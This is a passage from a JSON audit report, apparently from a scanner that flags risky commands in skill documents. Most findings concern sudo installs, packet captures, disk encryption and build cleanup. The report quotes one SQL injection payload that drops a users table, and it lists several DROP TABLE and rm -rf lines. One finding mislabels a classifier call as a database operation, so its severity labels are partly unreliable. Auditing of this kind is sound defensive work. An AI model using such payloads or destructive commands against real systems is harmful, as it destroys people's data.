        "file": "skills/cryptography/signing-verification.md",
        "line_number": 242,
        "issue": "Privilege escalation",
        "evidence": "sudo mv cosign-linux-amd64 /usr/local/bin/cosign",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest.md",
        "line_number": 265,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup enable",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 65,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install certbot python3-certbot-nginx",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 74,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot certonly --webroot \\",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 87,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot --nginx -d example.com -d www.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 99,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot certonly --manual \\",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 111,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot renew --dry-run",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 186,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl enable --now certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 187,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl list-timers certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1062,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksFormat /dev/sdb1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1065,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksOpen /dev/sdb1 encrypted_disk",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1068,
        "issue": "Privilege escalation",
        "evidence": "sudo mkfs.ext4 /dev/mapper/encrypted_disk",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1071,
        "issue": "Privilege escalation",
        "evidence": "sudo mount /dev/mapper/encrypted_disk /mnt/encrypted",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1074,
        "issue": "Privilege escalation",
        "evidence": "echo \"encrypted_disk /dev/sdb1 none luks\" | sudo tee -a /etc/crypttab",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1077,
        "issue": "Privilege escalation",
        "evidence": "echo \"/dev/mapper/encrypted_disk /mnt/encrypted ext4 defaults 0 2\" | sudo tee -a /etc/fstab",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1083,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksAddKey /dev/sdb1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1086,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksRemoveKey /dev/sdb1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1089,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file luks-header-backup",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1092,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksHeaderRestore /dev/sdb1 --header-backup-file luks-header-backup",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1102,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksAddKey /dev/sdb1 /root/keyfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1105,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksOpen /dev/sdb1 encrypted_disk --key-file /root/keyfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1117,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install ecryptfs-utils",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1121,
        "issue": "Privilege escalation",
        "evidence": "sudo mount -t ecryptfs ~/Private ~/Private",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1180,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup enable",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1183,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup status",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1186,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup list",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/key-management/resources/REFERENCE.md",
        "line_number": 2033,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install -y aws-cloudhsmv2-cli",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 707,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install -y ./cloudhsm-client-latest.el7.x86_64.rpm",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 710,
        "issue": "Privilege escalation",
        "evidence": "sudo /opt/cloudhsm/bin/configure -a <cluster-HSM-IP>",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 713,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start cloudhsm-client",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 796,
        "issue": "Privilege escalation",
        "evidence": "sudo dpkg -i yubihsm2-sdk/*.deb",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 799,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 800,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl enable yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 843,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install softhsm2",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 846,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install softhsm",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
        "line_number": 856,
        "issue": "Privilege escalation",
        "evidence": "sudo make install",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 51,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 227,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install -y ./cloudhsm-client-latest.el7.x86_64.rpm",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 230,
        "issue": "Privilege escalation",
        "evidence": "sudo /opt/cloudhsm/bin/configure -a <cluster-ip>",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 233,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start cloudhsm-client",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 241,
        "issue": "Privilege escalation",
        "evidence": "sudo dpkg -i yubihsm2-sdk/*.deb",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
        "line_number": 244,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start yubihsm-connector",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 787,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install certbot python3-certbot-nginx",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 790,
        "issue": "Privilege escalation",
        "evidence": "sudo yum install certbot python3-certbot-nginx",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 829,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl enable certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 830,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 894,
        "issue": "Force flag usage",
        "evidence": "acme.sh --renew -d example.com --force",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 1882,
        "issue": "Force flag usage",
        "evidence": "certbot renew --force-renewal --cert-name example.com",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 583,
        "issue": "Privilege escalation",
        "evidence": "sudo ntpdate pool.ntp.org",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/distributed-systems-debugging.md",
        "line_number": 586,
        "issue": "Privilege escalation",
        "evidence": "sudo timedatectl set-ntp true",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 130,
        "issue": "Privilege escalation",
        "evidence": "sudo mkdir -p /etc/systemd/system.conf.d/",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 131,
        "issue": "Privilege escalation",
        "evidence": "cat <<EOF | sudo tee /etc/systemd/system.conf.d/coredump.conf",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 136,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl daemon-reexec",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 139,
        "issue": "Privilege escalation",
        "evidence": "echo '/var/crash/core.%e.%p.%t' | sudo tee /proc/sys/kernel/core_pattern",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 331,
        "issue": "Privilege escalation",
        "evidence": "sudo pystack remote --pid 12345",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/core-dump-analysis.md",
        "line_number": 631,
        "issue": "Privilege escalation",
        "evidence": "echo '/var/crash/core.%e.%p.%t' | sudo tee /proc/sys/kernel/core_pattern",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/crash-debugging.md",
        "line_number": 321,
        "issue": "Privilege escalation",
        "evidence": "sudo make install",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/gdb-fundamentals.md",
        "line_number": 534,
        "issue": "Privilege escalation",
        "evidence": "sudo sysctl -w kernel.core_pattern=/tmp/core.%e.%p",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/lldb-macos-debugging.md",
        "line_number": 694,
        "issue": "Privilege escalation",
        "evidence": "sudo sysctl -w kern.corefile=/tmp/core.%P",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 154,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i eth0",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 157,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 160,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump host api.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 163,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump port 443",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 164,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump port 80 or port 443",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 167,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -A 'tcp port 80'",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 171,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any port 53",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 174,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -w /tmp/capture.pcap",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 180,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -tttt -i any port 443",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 183,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -c 100 -i any",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 186,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -v -i any host api.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 189,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump src 192.168.1.10",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 190,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump dst 10.0.0.5",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 193,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 196,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump 'tcp[tcpflags] & tcp-rst != 0'",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 199,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump host 192.168.1.10 and host 10.0.0.5",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 202,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any port not 22",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 205,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -s 65535 -i any -w /tmp/full-capture.pcap",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 208,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -A 'host api.example.com and port 443' -w /tmp/api-debug.pcap",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 421,
        "issue": "Privilege escalation",
        "evidence": "sudo ping -f api.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 518,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get update && sudo apt-get install -y \\",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 601,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -w /tmp/capture.pcap  # Fills disk!",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 604,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -c 1000 -w /tmp/capture.pcap  # 1000 packets",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 605,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -G 60 -w /tmp/capture.pcap    # 60 seconds",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/memory-leak-debugging.md",
        "line_number": 470,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install heaptrack heaptrack-gui",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 109,
        "issue": "Privilege escalation",
        "evidence": "sudo perf record -F 99 -g -a -- sleep 30",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 349,
        "issue": "Privilege escalation",
        "evidence": "sudo dtrace -x ustackframes=100 -n 'profile-997 /pid == <pid>/ { @[ustack()] = count(); }' -o out.stacks",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 428,
        "issue": "Privilege escalation",
        "evidence": "sudo iotop -o  # Only show processes doing I/O",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 434,
        "issue": "Privilege escalation",
        "evidence": "sudo perf trace -p <pid>",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 485,
        "issue": "Privilege escalation",
        "evidence": "sudo perf lock record -p <pid> -- sleep 30",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 488,
        "issue": "Privilege escalation",
        "evidence": "sudo perf lock report",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 519,
        "issue": "Privilege escalation",
        "evidence": "sudo perf record -F 99 -g -a -- sleep 30",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/remote-debugging.md",
        "line_number": 593,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install <package>-dbg",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/remote-debugging.md",
        "line_number": 596,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install python3.11-dbg",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/ml/custom-llm-evaluation.md",
        "line_number": 302,
        "issue": "Destructive database operation",
        "evidence": "pred = self.toxicity_classifier(text[:512])[0]  # Truncate to model limit",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/bazel-monorepos.md",
        "line_number": 45,
        "issue": "Privilege escalation",
        "evidence": "sudo mv bazelisk-linux-amd64 /usr/local/bin/bazel",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/make-fundamentals.md",
        "line_number": 190,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf $(BUILDDIR) $(TARGET)",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/make-fundamentals.md",
        "line_number": 351,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf $(BUILDDIR)",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/cmake-patterns.md",
        "line_number": 605,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf build                           # Full clean - cleans build artifacts only",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 231,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install ccache         # Linux",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 545,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf src  # Safe: cleaning temporary build directory",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 657,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install distcc",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 672,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install icecc",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 126,
        "issue": "Destructive database operation",
        "evidence": "\"'; DROP TABLE users; --\",  # Example of destructive injection payload",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/data/etl-patterns.md",
        "line_number": 44,
        "issue": "Destructive database operation",
        "evidence": "\u2192 Pattern: TRUNCATE + INSERT or DROP + CREATE  <!-- ETL operations on target tables -->",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/data/etl-patterns.md",
        "line_number": 322,
        "issue": "Destructive database operation",
        "evidence": "conn.execute(f\"DROP TABLE {temp_table}\")",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/data/etl-patterns.md",
        "line_number": 357,
        "issue": "Destructive database operation",
        "evidence": "cursor.execute(f\"DROP TABLE {stage_table}\")",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 255,
        "issue": "Privilege escalation",
